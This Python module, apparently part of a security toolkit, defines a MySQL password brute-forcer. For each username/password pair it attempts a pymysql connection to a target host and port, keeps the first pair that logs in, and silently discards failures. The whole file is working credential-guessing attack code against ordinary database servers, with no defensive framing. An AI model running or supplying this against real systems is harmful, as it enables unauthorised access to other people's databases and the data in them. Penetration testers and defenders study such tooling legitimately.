#!/usr/bin/env python
# -*- coding: utf-8 -*-

import pymysql

from saker.brute.brute import Brute


class MySQL(Brute):

    """MySQL password brute
    """

    def __init__(self, addr, port):
        super(MySQL, self).__init__()
        self.addr = addr
        self.port = port

    def do(self, arg, res):
        if len(res) > 0:
            return
        user, pwd = arg
        try:
            conn = pymysql.connect(
                host=self.addr,
                port=self.port,
                user=user,
                passwd=pwd
            )
            res.append(arg)
        except Exception as e:
            pass
